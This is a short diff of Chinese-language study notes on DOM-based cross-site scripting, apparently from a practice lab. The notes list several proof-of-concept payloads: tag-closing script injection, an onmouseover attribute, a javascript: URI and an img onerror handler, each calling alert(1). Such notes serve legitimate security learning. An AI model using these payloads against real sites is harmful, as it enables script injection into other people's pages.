@@ -1,6 +1,6 @@
 DOM型XSS
 页面不与后台服务器交互，用F12抓包看提交信息为<a href  ，先考虑闭合标签
-'><script>alert(1)</script>         #虽然闭合了前面的标签但是没有任何反应,然后又尝试了'></a>也没用，应该是安全策略问题。
+'><script>alert(1)</script>      #虽然闭合了前面的标签但是没有任何反应,然后又尝试了'></a>也没用，应该是安全策略问题。
 ' onmouseover="alert(1)" '
 javascript:alert(1)
 '><img src=x onerror=alert(1)>
